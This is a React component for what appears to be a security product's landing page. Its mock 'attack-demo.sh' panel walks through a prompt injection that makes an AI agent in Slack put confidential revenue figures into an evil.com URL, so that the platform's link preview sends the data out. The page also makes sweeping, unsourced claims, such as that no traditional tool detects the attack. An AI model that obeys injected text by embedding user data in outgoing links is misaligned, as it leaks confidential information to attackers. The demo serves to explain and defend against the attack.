export default function Problem() {
  return (
    <section id="problem" className="py-20 px-4 sm:px-6 lg:px-8 bg-slate-900">
      <div className="max-w-7xl mx-auto">
        <div className="text-center mb-12">
          <h2 className="text-3xl sm:text-4xl font-bold text-white">
            The Attack Your Security Team Is Missing
          </h2>
          <p className="mt-4 text-lg text-slate-400 max-w-2xl mx-auto">
            When AI agents generate URLs in messaging platforms, link previews automatically fetch those URLs &mdash; silently exfiltrating sensitive data to attacker-controlled servers.
          </p>
        </div>

        <div className="max-w-4xl mx-auto bg-slate-800 rounded-xl border border-slate-700 overflow-hidden">
          <div className="flex items-center gap-2 px-4 py-3 bg-slate-800 border-b border-slate-700">
            <div className="w-3 h-3 rounded-full bg-red-500" />
            <div className="w-3 h-3 rounded-full bg-yellow-500" />
            <div className="w-3 h-3 rounded-full bg-green-500" />
            <span className="ml-2 text-xs text-slate-500 font-mono">attack-demo.sh</span>
          </div>
          <div className="p-6 font-mono text-sm leading-relaxed">
            <p className="text-slate-500"># Step 1: User asks AI agent a question in Slack</p>
            <p className="text-green-400 mt-1">User: &quot;What are our Q4 revenue projections?&quot;</p>
            <p className="text-slate-500 mt-4"># Step 2: AI agent retrieves confidential data</p>
            <p className="text-blue-400 mt-1">Agent: &quot;Based on our internal data, Q4 revenue is projected at $12.4M...&quot;</p>
            <p className="text-slate-500 mt-4"># Step 3: Attacker&apos;s injected prompt causes agent to embed data in URL</p>
            <p className="text-red-400 mt-1">Agent: &quot;For more details, see: https://evil.com/log?data=<span className="text-yellow-400">Q4_revenue_12.4M_confidential</span>&quot;</p>
            <p className="text-slate-500 mt-4"># Step 4: Slack automatically generates URL preview, sending GET request</p>
            <p className="text-red-400 mt-1">→ GET https://evil.com/log?data=Q4_revenue_12.4M_confidential</p>
            <p className="text-red-accent mt-1 font-bold">⚠ Data exfiltrated. No user interaction required.</p>
          </div>
        </div>

        <div className="mt-12 grid grid-cols-1 md:grid-cols-3 gap-6 max-w-4xl mx-auto">
          {[
            { stat: "100%", label: "of messaging platforms auto-fetch URL previews" },
            { stat: "0", label: "traditional security tools detect this attack vector" },
            { stat: "<5 min", label: "to exploit once access to the agent prompt exists" },
          ].map((item) => (
            <div key={item.label} className="text-center p-6 bg-slate-800/50 rounded-xl border border-slate-700">
              <div className="text-3xl font-bold text-red-accent">{item.stat}</div>
              <div className="mt-2 text-sm text-slate-400">{item.label}</div>
            </div>
          ))}
        </div>
      </div>
    </section>
  );
}
